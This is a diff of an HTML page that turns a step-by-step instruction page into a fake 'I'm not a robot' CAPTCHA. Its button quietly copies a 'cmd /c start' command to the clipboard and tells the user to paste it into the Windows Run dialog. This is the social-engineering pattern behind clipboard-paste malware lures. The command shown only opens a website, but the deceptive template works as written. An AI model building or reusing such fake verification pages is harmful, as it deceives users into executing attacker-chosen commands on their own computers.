@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Verification Steps</title>
+  <title>Verify You Are Human</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      background: #f4f4f4;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -17,51 +17,35 @@
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-      text-align: left;
-      width: 300px;
-    }
-    h2 {
       text-align: center;
     }
-    ol {
-      padding-left: 20px;
-    }
-    .btn {
-      display: block;
-      margin: 20px auto 0;
-      padding: 10px 20px;
-      background-color: #007BFF;
+    button {
+      background: #4285f4;
       color: white;
+      padding: 10px 20px;
       border: none;
-      border-radius: 5px;
+      border-radius: 4px;
+      margin-top: 20px;
       cursor: pointer;
-      font-size: 16px;
     }
-    .btn:hover {
-      background-color: #0056b3;
+    button:hover {
+      background: #3367d6;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>Verification Steps</h2>
-    <ol>
-      <li>Press <b>Windows</b> + <b>R</b></li>
-      <li>Press <b>CTRL</b> + <b>V</b></li>
-      <li>Press <b>Enter</b></li>
-    </ol>
-    <button class="btn" onclick="copyAndNotify()">Copy Command</button>
+    <h2>Verify You Are Human</h2>
+    <p>Please verify that you are a human to continue.</p>
+    <button onclick="verifyAndRedirect()">I'm not a robot</button>
   </div>
 
   <script>
-    function copyAndNotify() {
+    function verifyAndRedirect() {
       const command = "cmd /c start https://www.omantel.om";
       navigator.clipboard.writeText(command).then(() => {
-        alert("Command copied to clipboard.\nNow press Win + R, paste, and press Enter.");
-        // Optional auto-redirect after 5 seconds
-        setTimeout(() => {
-          window.location.href = "https://www.omantel.om";
-        }, 5000);
+        alert("Command copied to clipboard.\nPress Win + R, paste it, and hit Enter.");
+        window.location.href = "steps.html";
       });
     }
   </script>
